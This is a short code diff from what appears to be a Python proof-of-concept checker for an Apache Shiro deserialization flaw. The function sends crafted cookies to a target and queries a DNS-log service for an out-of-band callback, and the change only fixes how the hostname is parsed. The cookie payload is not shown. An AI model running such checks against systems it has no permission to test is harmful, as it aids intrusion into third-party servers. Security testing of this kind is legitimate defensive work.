@@ -25,7 +25,7 @@ def poc(url):
     try:
         requests.get(target, cookies=cookies, timeout=10)
         q = queryDnsRecord('shiro.xxx.dnslog.info')
-        if url.split(':')[0] in q:
+        if url.split('://')[-1].split(':')[0] in q:
             return url
     except Exception, e:
         pass
